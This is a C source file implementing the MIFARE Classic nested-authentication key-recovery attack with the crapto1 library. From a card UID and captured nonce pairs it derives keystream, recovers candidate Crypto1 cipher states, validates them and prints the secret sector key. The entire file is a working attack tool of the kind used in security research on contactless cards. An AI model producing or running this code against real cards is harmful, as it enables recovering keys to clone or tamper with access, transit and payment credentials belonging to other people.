/*  nested.c
 *
 *  MIFARE Classic key recovery from nested authentication nonce pairs.
 *  Uses lfsr_recovery32 to find candidate LFSR states from predicted
 *  keystream, validates against additional nonce pairs.
 *
 *  Usage: nested <uid> <dist> <ntK0> <ntT0> [<ntK1> <ntT1> ...]
 *  uid: 32-bit card UID (hex)
 *  dist: PRNG distance between known and target nonces (decimal)
 *  ntKN: known-sector nonce (hex)
 *  ntTN: target-sector encrypted nonce (hex)
 *
 *  Outputs: "Found key: <12-hex-chars>" or "No key found"
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include "crapto1.h"

int main(int argc, char *argv[]) {
    if (argc < 5 || (argc - 3) % 2 != 0) {
        fprintf(stderr,
            "Usage: %s <uid> <dist> <ntK0> <ntT0> [<ntK1> <ntT1> ...]\n"
            "  uid:  card UID (hex)\n"
            "  dist: PRNG distance (decimal)\n"
            "  ntKN: known-sector nonce (hex)\n"
            "  ntTN: target-sector encrypted nonce (hex)\n",
            argv[0]);
        return 1;
    }

    uint32_t uid;
    sscanf(argv[1], "%x", &uid);
    int dist = atoi(argv[2]);

    int npairs = (argc - 3) / 2;
    uint32_t *nt_known  = malloc(npairs * sizeof(uint32_t));
    uint32_t *nt_target = malloc(npairs * sizeof(uint32_t));
    if (!nt_known || !nt_target) {
        fprintf(stderr, "Memory allocation failed\n");
        return 2;
    }

    for (int i = 0; i < npairs; i++) {
        sscanf(argv[3 + i * 2], "%x", &nt_known[i]);
        sscanf(argv[4 + i * 2], "%x", &nt_target[i]);
    }

    /* Predict plaintext nonce for first pair */
    uint32_t nt_pred0 = prng_successor(nt_known[0], dist);
    uint32_t ks32 = nt_target[0] ^ nt_pred0;

    /* Recover candidate LFSR states */
    struct Crypto1State *candidates = lfsr_recovery32(ks32, uid ^ nt_pred0);
    if (!candidates) {
        fprintf(stderr, "lfsr_recovery32 allocation failed\n");
        free(nt_known);
        free(nt_target);
        return 2;
    }

    int found = 0;
    for (struct Crypto1State *t = candidates; t->odd | t->even; ++t) {
        /* Roll back uid^nt feed to extract the raw key */
        lfsr_rollback_word(t, uid ^ nt_pred0, 0);
        uint64_t key;
        crypto1_get_lfsr(t, &key);

        /* Validate against all remaining pairs */
        int valid = 1;
        for (int i = 1; i < npairs && valid; i++) {
            uint32_t nt_pred_i = prng_successor(nt_known[i], dist);
            struct Crypto1State *s = crypto1_create(key);
            if (!s) { valid = 0; break; }
            uint32_t ks32_i = crypto1_word(s, uid ^ nt_pred_i, 0);
            if (ks32_i != (nt_target[i] ^ nt_pred_i)) {
                valid = 0;
            }
            crypto1_destroy(s);
        }

        if (valid) {
            printf("Found key: %012" PRIx64 "\n", key);
            found = 1;
            break;
        }
    }

    free(candidates);
    free(nt_known);
    free(nt_target);

    if (!found) {
        printf("No key found\n");
        return 1;
    }

    return 0;
}
